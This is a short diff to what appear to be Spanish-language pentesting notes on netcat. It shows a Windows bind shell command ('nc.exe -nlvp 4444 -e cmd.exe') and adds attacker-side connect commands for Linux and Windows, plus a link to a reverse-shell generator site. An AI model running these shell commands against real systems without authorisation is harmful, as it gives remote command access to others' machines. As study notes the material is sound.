@@ -42,5 +42,13 @@ nc.exe -nlvp 4444 -e cmd.exe
 
 #### En el atacante:
 
+#Linux
 nc -nv <IP_OBJETIVO> 4444
+
+#Windows
+nc.exe -nv <IP_OBJETIVO> 4444
+
 ```
+
+Recurso de reverse SHELL
+https://www.revshells.com/
